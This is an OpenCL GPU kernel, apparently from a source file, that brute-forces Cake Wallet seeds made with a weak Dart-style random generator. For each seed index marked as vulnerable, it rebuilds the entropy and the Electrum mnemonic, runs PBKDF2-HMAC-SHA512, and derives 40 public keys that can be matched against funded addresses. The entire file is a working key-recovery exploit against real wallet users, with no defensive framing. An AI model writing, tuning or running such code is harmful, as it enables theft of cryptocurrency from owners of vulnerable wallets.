// Cake Wallet Batch Address Derivation
// Input: List of confirmed vulnerable seed indices
// Output: 40 P2WPKH Public Keys (Compressed 33-byte) per seed
// Path: m/0'/{change}/{index}

__kernel void batch_cake_full(
    __global const uint* input_seeds,
    __global uchar* output_pubkeys, // 40 * 33 bytes per seed
    uint batch_size
) {
    uint gid = get_global_id(0);
    if (gid >= batch_size) return;

    uint seed_index = input_seeds[gid];
    
    // 1. Reconstruct Entropy (Dart Random)
    uchar bytes[17] __attribute__((aligned(4))) = {0};
    uint state = seed_index;
    for (int i = 0; i < 17; i++) {
        state = state * 0x5DEECE66DUL + 0xB;
        bytes[i] = (state >> 24) & 0xFF;
    }
    bytes[16] &= 0x0F; // Mask last byte
    
    // 2. Mnemonic Generation (Electrum)
    ushort word_indices[12];
    int bit_offset = 0;
    for (int w = 0; w < 12; w++) {
        int byte_idx = bit_offset / 8;
        int bit_idx = bit_offset % 8;
        
        uint bits = 0;
        bits |= ((uint)bytes[byte_idx]) << 16;
        bits |= ((uint)bytes[byte_idx + 1]) << 8;
        if (byte_idx + 2 < 17) bits |= bytes[byte_idx + 2];
        
        word_indices[w] = (bits >> (13 - bit_idx)) & 0x7FF;
        bit_offset += 11;
    }
    
    uchar mnemonic[180] = {0};
    int mnemonic_len = 0;
    for (int i = 0; i < 12; i++) {
        int word_idx = word_indices[i];
        int word_length = word_lengths[word_idx];
        for (int j = 0; j < word_length; j++) {
            mnemonic[mnemonic_len++] = words[word_idx][j];
        }
        if (i < 11) mnemonic[mnemonic_len++] = ' ';
    }
    
    // 3. PBKDF2-HMAC-SHA512 (Electrum Salt)
    uchar seed[64] __attribute__((aligned(8))) = {0};
    uchar ipad_key[128] __attribute__((aligned(4)));
    uchar opad_key[128] __attribute__((aligned(4)));
    
    for (int x = 0; x < 128; x++) { ipad_key[x] = 0x36; opad_key[x] = 0x5c; }
    for (int x = 0; x < mnemonic_len; x++) { ipad_key[x] ^= mnemonic[x]; opad_key[x] ^= mnemonic[x]; }
    
    uchar salt[12] = {101, 108, 101, 99, 116, 114, 117, 109, 0, 0, 0, 1}; 
    uchar sha512_result[64] __attribute__((aligned(8))) = {0};
    uchar key_previous_concat[256] __attribute__((aligned(4))) = {0};
    
    // Initial rounds
    for (int x = 0; x < 128; x++) key_previous_concat[x] = ipad_key[x];
    for (int x = 0; x < 12; x++) key_previous_concat[128 + x] = salt[x];
    sha512((__private ulong*)key_previous_concat, 140, (__private ulong*)sha512_result);
    
    for (int x = 0; x < 128; x++) key_previous_concat[x] = opad_key[x];
    for (int x = 0; x < 64; x++) key_previous_concat[128 + x] = sha512_result[x];
    sha512((__private ulong*)key_previous_concat, 192, (__private ulong*)sha512_result);
    
    for (int x = 0; x < 64; x++) seed[x] = sha512_result[x];
    
    for (int iter = 1; iter < 2048; iter++) {
        for (int x = 0; x < 128; x++) key_previous_concat[x] = ipad_key[x];
        for (int x = 0; x < 64; x++) key_previous_concat[128 + x] = sha512_result[x];
        sha512((__private ulong*)key_previous_concat, 192, (__private ulong*)sha512_result);
        
        for (int x = 0; x < 128; x++) key_previous_concat[x] = opad_key[x];
        for (int x = 0; x < 64; x++) key_previous_concat[128 + x] = sha512_result[x];
        sha512((__private ulong*)key_previous_concat, 192, (__private ulong*)sha512_result);
        
        for (int x = 0; x < 64; x++) seed[x] ^= sha512_result[x];
    }
    
    // 4. Derivation Loop (40 addresses)
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);
    
    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, 0); // m/0'
    
    // Output pointer base for this seed
    __global uchar* my_output = output_pubkeys + (gid * 40 * 33);
    
    for (uint change = 0; change <= 1; change++) {
        extended_private_key_t chain_key;
        normal_private_child_from_private(&account_key, &chain_key, change);
        
        for (uint addr_idx = 0; addr_idx < 20; addr_idx++) {
            extended_private_key_t address_key;
            normal_private_child_from_private(&chain_key, &address_key, addr_idx);
            
            extended_public_key_t address_pub;
            public_from_private(&address_key, &address_pub);
            
            // Store 33-byte serialized public key
            uchar serialized[33];
            secp256k1_ec_pubkey_serialize(serialized, 33, &address_pub.public_key.key, SECP256K1_EC_COMPRESSED); // 258
            
            int out_idx = (change * 20 + addr_idx) * 33;
            for (int k = 0; k < 33; k++) {
                my_output[out_idx + k] = serialized[k];
            }
        }
    }
}
